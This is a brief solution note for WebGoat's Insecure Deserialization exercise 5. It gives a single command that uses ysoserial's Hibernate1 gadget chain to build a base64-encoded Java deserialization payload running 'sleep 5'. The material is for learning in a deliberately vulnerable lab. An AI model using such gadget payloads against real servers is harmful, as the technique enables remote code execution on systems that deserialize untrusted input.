# Insecure Deserialization
## Insecure Deserialization
### Number 5

![Exercise](https://github.com/AlessandroMorelli96/WebGoat/blob/master/images/08_01.png)

Clone [ysoserial](https://github.com/frohoff/ysoserial) and run:

```
java -jar ysoserial.jar Hibernate1 "sleep 5" | base64 -w0 
```
